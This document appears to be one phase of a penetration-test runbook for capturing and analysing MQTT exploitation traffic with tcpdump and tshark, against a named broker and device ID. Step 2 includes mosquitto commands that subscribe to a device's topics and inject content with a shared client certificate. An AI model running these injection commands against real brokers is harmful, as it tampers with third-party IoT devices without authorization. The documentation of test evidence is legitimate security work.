# Phase 5: Traffic Capture & Evidence Collection

**Objective:** Capture all exploitation traffic as forensic evidence, providing proof-of-concept traffic recordings and reproducible evidence for the penetration test report.

## Prerequisites

- `tcpdump` and `tshark` installed
- Root/sudo access for packet capture
- Exploitation phase (3-4) completed or in progress
- Clean working directory for pcaps

## Step 1: Prepare Evidence Capture

```bash
# Create evidence directory with timestamp
EVIDENCE_DIR="evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

# Record environment info
echo "Capture started: $(date)" > "$EVIDENCE_DIR/capture_info.txt"
echo "Interface: $(ip route | grep default | awk '{print $5}')" >> "$EVIDENCE_DIR/capture_info.txt"
echo "Source IP: $(hostname -I | awk '{print $1}')" >> "$EVIDENCE_DIR/capture_info.txt"
echo "Target: pulse.n-compass.online:8883" >> "$EVIDENCE_DIR/capture_info.txt"
```

## Step 2: Background Capture During Exploitation

```bash
# Start capture in background — captures ALL MQTT traffic
sudo tcpdump -i wlan0 -n port 8883 \
  -w "$EVIDENCE_DIR/exploit_capture.pcap" \
  -c 500 &

CAPTURE_PID=$!
echo "Capture PID: $CAPTURE_PID"
```

Now run exploitation commands (Phase 3 and 4) while capture is running:

```bash
# --- Run exploitation commands here ---
# These will be captured in the pcap

# Example: subscribe and capture traffic
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/#" -v -C 5 -W 20 &

SUB_PID=$!

# Publish content injection
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/content" \
  -m '{"test_content.mp4":{"seq":1,"duration":60,"isFullScreen":true}}'

# Wait for traffic to flow
sleep 15

# Stop capture
kill $CAPTURE_PID 2>/dev/null
kill $SUB_PID 2>/dev/null
wait
```

## Step 3: Analyze Capture with tcpdump

```bash
# Quick summary of captured packets
echo "=== CAPTURE SUMMARY ==="
sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" -n 2>/dev/null | head -20

echo ""
echo "=== PACKET COUNT ==="
sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" -n 2>/dev/null | wc -l

echo ""
echo "=== UNIQUE IPs ==="
sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" -n 2>/dev/null | \
  grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u

echo ""
echo "=== TLS HANDSHAKE CONFIRMATION ==="
sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" -A 2>/dev/null | \
  grep -i "pulse.n-compass.online" | head -5
```

## Step 4: Deep Analysis with tshark

```bash
# MQTT packet summary
echo "=== MQTT PACKETS ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" -T fields \
  -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport \
  -e mqtt.msgtype -e mqtt.topic 2>/dev/null | \
  column -t -s $'\t'

# Count MQTT message types
echo ""
echo "=== MQTT MESSAGE TYPE DISTRIBUTION ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" -T fields \
  -e mqtt.msgtype 2>/dev/null | sort | uniq -c | sort -rn

# Map MQTT message types to names
echo ""
echo "=== MQTT MESSAGE TYPE MAP ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" -T fields \
  -e mqtt.msgtype 2>/dev/null | sort -u | while read type; do
  case $type in
    1) name="CONNECT" ;;
    2) name="CONNACK" ;;
    3) name="PUBLISH" ;;
    4) name="PUBACK" ;;
    5) name="PUBREC" ;;
    6) name="PUBREL" ;;
    7) name="PUBCOMP" ;;
    8) name="SUBSCRIBE" ;;
    9) name="SUBACK" ;;
    10) name="UNSUBSCRIBE" ;;
    11) name="UNSUBACK" ;;
    12) name="PINGREQ" ;;
    13) name="PINGRESP" ;;
    14) name="DISCONNECT" ;;
    15) name="AUTH" ;;
    *) name="UNKNOWN" ;;
  esac
  echo "  Type $type: $name"
done
```

## Step 5: Extract MQTT Topics from Capture

```bash
# Extract all MQTT topics visible in the capture
echo "=== MQTT TOPICS OBSERVED ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt.msgtype == 3" -T fields \
  -e mqtt.topic 2>/dev/null | sort -u

# Extract CONNECT client ID
echo ""
echo "=== CONNECT CLIENT IDs ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt.msgtype == 1" -T fields \
  -e mqtt.clientid 2>/dev/null | sort -u
```

## Step 6: Full Packet Dissection (Critical Packets)

```bash
# Full dissection of all MQTT packets (save to file)
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" -V \
  2>/dev/null > "$EVIDENCE_DIR/mqtt_dissection.txt"

echo "Dissection saved: $(wc -l < "$EVIDENCE_DIR/mqtt_dissection.txt") lines"

# Show first MQTT packet in detail
echo ""
echo "=== SAMPLE MQTT PACKET DETAIL ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" -V \
  2>/dev/null | head -80

# Show PUBLISH packets specifically (the exploitation evidence)
echo ""
echo "=== PUBLISH PACKETS (EXPLOITATION EVIDENCE) ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt.msgtype == 3" -V \
  2>/dev/null | grep -E "(Topic|Payload|Message)" | head -20
```

## Step 7: TLS Analysis

```bash
# TLS handshake details
echo "=== TLS HANDSHAKE ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "tls.handshake" -V \
  2>/dev/null | grep -E "(Version|Cipher|Server Name|Certificate)" | head -15

# Verify TLS version
echo ""
echo "=== TLS VERSION ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "tls.handshake.type == 1" -T fields \
  -e tls.handshake.version 2>/dev/null | sort -u

# Check certificate details (if visible)
echo ""
echo "=== SERVER CERTIFICATE ==="
tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "x509af" -V \
  2>/dev/null | grep -E "(Subject|Issuer|CN=)" | head -10
```

## Step 8: Generate Evidence Summary

```bash
# Create final evidence summary
cat > "$EVIDENCE_DIR/EVIDENCE_SUMMARY.md" << REPORT
# Evidence Summary
## Capture Details
- Date: $(date)
- Duration: $(sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" -tt 2>/dev/null | tail -1 | awk '{print $1}')s (last - first timestamp)
- Total packets: $(sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" 2>/dev/null | wc -l)
- MQTT packets: $(tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" 2>/dev/null | wc -l)

## Targets
- Broker: pulse.n-compass.online:8883
- Device: 882985e065594198
- Client ID: dadf6f9ef35e55ab

## TLS
- Version: $(tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "tls.handshake.type == 1" -T fields -e tls.handshake.version 2>/dev/null | sort -u)

## MQTT Topics Observed
$(tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt.msgtype == 3" -T fields -e mqtt.topic 2>/dev/null | sort -u | sed 's/^/- /')

## MQTT Message Types
$(tshark -r "$EVIDENCE_DIR/exploit_capture.pcap" -Y "mqtt" -T fields -e mqtt.msgtype 2>/dev/null | sort | uniq -c | sort -rn | sed 's/^/- /')

## Files
- exploit_capture.pcap — Raw packet capture
- mqtt_dissection.txt — Full MQTT packet dissection
- capture_info.txt — Environment details
- EVIDENCE_SUMMARY.md — This file
REPORT

echo "Evidence summary written to $EVIDENCE_DIR/EVIDENCE_SUMMARY.md"
```

## Step 9: Export for Report

```bash
# Convert pcap to readable format for inclusion in report
echo "=== PCAP ASCII REPRESENTATION ==="
sudo tcpdump -r "$EVIDENCE_DIR/exploit_capture.pcap" -A 2>/dev/null | \
  grep -v "^$" | head -30 > "$EVIDENCE_DIR/evidence_ascii.txt"

# List all evidence files
echo ""
echo "=== EVIDENCE FILES ==="
ls -la "$EVIDENCE_DIR/"
```

## Evidence Checklist

- [ ] Raw pcap file captured (`exploit_capture.pcap`)
- [ ] TLS handshake confirmed (version, cipher, server cert)
- [ ] MQTT CONNECT packet showing client authentication
- [ ] MQTT SUBSCRIBE/SUBACK showing topic access
- [ ] MQTT PUBLISH packets showing content injection
- [ ] Topic list extracted from capture
- [ ] Full packet dissection saved
- [ ] Evidence summary generated
- [ ] Environment details recorded

## Chain of Custody Notes

For professional pentest reporting:

- All captures taken with explicit authorization (document engagement letter)
- Timestamps recorded in capture metadata
- No customer data modified or exfiltrated — only test payloads used
- Test payloads clearly marked (e.g., `{"test":true}` or `test_manifest.json`)
- All test content documented and, where possible, removed after testing

## Files Generated

```
evidence_<timestamp>/
├── exploit_capture.pcap      # Raw packet capture (Wireshark-compatible)
├── mqtt_dissection.txt       # Full MQTT protocol dissection
├── capture_info.txt          # Environment and target info
├── evidence_ascii.txt        # ASCII representation for report
└── EVIDENCE_SUMMARY.md       # Summary of findings
```

These files serve as **forensic evidence** for the pentest report. The pcap can be opened in Wireshark for visual demonstration to stakeholders.

**Next:** `exploit-network-summary.md` — Executive summary of the complete attack chain.
